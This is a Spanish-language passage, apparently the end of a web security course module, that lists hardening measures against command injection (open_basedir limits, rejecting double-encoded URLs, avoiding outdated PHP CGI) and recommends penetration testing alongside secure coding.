- Limite el alcance accesible por la aplicación web a su carpeta (por ejemplo, en PHP open_basedir = “/var/www/html”).

- Rechace las solicitudes con doble codificación y los caracteres no ASCII en las URL.

- Evitar el uso de bibliotecas y módulos sensibles u obsoletos (por ejemplo, PHP CGI).

Al final, incluso después de todas estas medidas de seguridad y configuraciones, tenemos que aplicar las técnicas de pruebas de penetración que hemos aprendido en este módulo para ver si alguna funcionalidad de la aplicación web sigue siendo vulnerable a la inyección de comandos. Dado que algunas aplicaciones web tienen millones de líneas de código, cualquier error en una sola línea de código puede ser suficiente para introducir una vulnerabilidad. Por lo tanto, debemos intentar proteger la aplicación web complementando las mejores prácticas de codificación segura con pruebas de penetración exhaustivas.
